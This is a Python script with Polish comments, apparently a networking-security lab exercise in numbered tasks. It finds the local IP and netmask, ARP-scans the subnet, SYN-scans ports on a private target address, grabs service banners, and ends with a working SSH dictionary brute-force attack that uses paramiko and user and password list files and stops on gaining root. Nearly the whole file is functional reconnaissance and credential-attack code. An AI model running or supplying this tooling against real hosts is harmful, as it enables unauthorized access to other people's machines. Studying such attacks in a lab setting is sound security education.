# Zadanie 1 i 2 - ustalanie wasnego adresu IP i maski podsieci - wykorzystanie netifaces
import netifaces


def get_iface_data(iface: str):
    iface_list = netifaces.interfaces()
    if iface in iface_list:
        addrs = netifaces.ifaddresses("eth0")
        mac_addr = addrs[netifaces.AF_LINK][0]["addr"]
        ip_addr = addrs[netifaces.AF_INET][0]["addr"]
        netmask = addrs[netifaces.AF_INET][0]["netmask"]
        broadcast = addrs[netifaces.AF_INET][0]["broadcast"]
        return {"IP": ip_addr, "MAC": mac_addr, "netmask": netmask, "broadcast": broadcast}
    return None


my_iface = "eth0"
my_iface_data = get_iface_data("eth0")
if my_iface_data is None:
    print("Nie znaleziono odpowiedniego interfejsu sieciowego!")
    exit(1)

my_ip = my_iface_data["IP"]
my_mac = my_iface_data["MAC"]
my_nmask = my_iface_data["netmask"]
print(f"Interfejs sieciowy: {my_iface}\n Moje IP: {my_ip}\n moj MAC: {my_mac}\n moja maska podsieci: {my_nmask}")
# dane o seci zebrane


###### Zdanie 3 - skanowanie sieci #######

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp1, sr

# pobieranie adresow IP nalezacych do danej podsieci na podstawie maski i jakiegos (np. wlasnego) IP nalezacego do tej podsieci
# zalozenie, ze maska moze byc tylko 255.255.255.0 lub 255.255.0.0
def get_ips_in_submask(netmask: str, an_ip: str):
    if (netmask.count(".") == 3) and (an_ip.count(".") == 3):
        if netmask == "255.255.255.0":
            base = an_ip[:an_ip.rfind(".") + 1]
            return [base + str(i) for i in range(1, 255)]
        if netmask == "255.255.0.0":
            base = an_ip[:an_ip.rfind(".")]
            base = base[:base.rfind(".") + 1]
            return [base + str(i) + "." + str(j) for i in range(1, 255) for j in range(1, 255)]
        return None


def get_targets_ips_and_macs(ip_list_to_scan):
    ip_mac_res = {}
    for ip in ip_list_to_scan:
        arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        arp_res = srp1(arp_req, timeout=1, verbose=0)
        if arp_res:
            ip_mac_res[arp_res.psrc] = arp_res.hwsrc
    return ip_mac_res


# my_mask i my_ip to znalezione w zadaniu 1 i 2 moj IP i moja maska podsieci
ip_list = get_ips_in_submask(my_nmask, my_ip)
# dla uproszczenia i przyspieszenia skanowania, zakres ip jest ograniczony
print("\n******** Skanowanie sieci (IP) dla wybranego zakresu ****\n")
ip_list_reduced = ip_list[10:18]
get_targets_ips_and_macs = get_targets_ips_and_macs(ip_list_reduced)
for ip, mac in get_targets_ips_and_macs.items():
    print(f"adres IP: {ip}, adres MAC: {mac}")

# znaleziony cel: 192.168.0.12



### Zadanie 4 - szukanie otwartych portow dla celu

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr

# znajdowanie otwartych portow dla wskazanego IP i wybranej listy portow do sprawdzenia
def find_opened_ports_tcp(ip, port_list):
    results = []
    for port in port_list:
        x = (IP(dst=ip) / TCP(dport=[port], flags="S"))
        ans, notans = sr(x, timeout=1, verbose=0)
        if ans:
            dane = "{}".format(str(ans[0]).split(" ")[7][6:])
            results.append(f"Port: {port}, protokol TCP, usluga = {dane}")
    return results


# znaleziony wczesniej adres IP celu:
target_ip = "192.168.0.12"
# ograniczenie zakresu skanowania portow (polowanie na SSH)
ports = range(101)
print(f"\n******** Skanowanie portow dla wybranego ip: {target_ip}****\n")
opened_ports = find_opened_ports_tcp(target_ip, ports)
for port in opened_ports:
    print(port)

#####  Zdanie 5 - zbieranie informacji o uslugach  #####
# Zbieranie informacji o uslugach dzialajacych na portach atakowanej maszyny
print(f"\n******** Grabing banner dla wybranego ip: {target_ip} ****\n")

import socket

# skan danej uslugi na zdanym porcie na atakowanej maszynie
def grab_banner(ip_address, port):
    try:
        s = socket.socket()
        s.connect((ip_address, port))
        s.send("Dummy\r\n".encode())
        banner = s.recv(2048).decode()
        print(ip_address, ':', port, "-", banner)
    except Exception as e:
        # print("exception:", e)
        return


# wyswieltenie info o uslugach
for port in ports:
    grab_banner(target_ip, port)



### Zdanie 6 -  hackowanie SSH wybranoego IP ###
import paramiko

print("***** Hackowanie SSH *******")

# atak slownikowy, wczytanie listy uzytkownikow i hasel z plikow
def get_list_from_file(filename):
    with open(filename, "r") as f:
        lines = f.readlines()
        return [line.strip() for line in lines]

# przeprowadza atak, konczy gdy znajdzie uzytkownika root
def ssh_hacking(target_ip, target_port, usr_list, pswd_list):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.load_system_host_keys()
    for usr in usr_list:
        for pswd in pswd_list:
            try:
                ssh_client.connect(target_ip, target_port, usr, pswd)
                stdin, stdout, stderr = ssh_client.exec_command("whoami")
                role = stdout.readline().replace("\n", "").strip()
                print(f"Uzytkownik: {usr} haslo: {pswd} konto: {role}")
                if role == "root":
                    return
            except:
                continue

# IP i port ustalony wczesniej na podstawie skanowania sieci
target_ip = "192.168.0.12"
target_port = 22
# atakbrute-force, atak na podstawie slownikow - pliki z lista uzytkownikow i hasel
usr_list = get_list_from_file("user.lst")
pass_list = get_list_from_file("pass.lst")
ssh_hacking(target_ip, target_port, usr_list, pass_list)
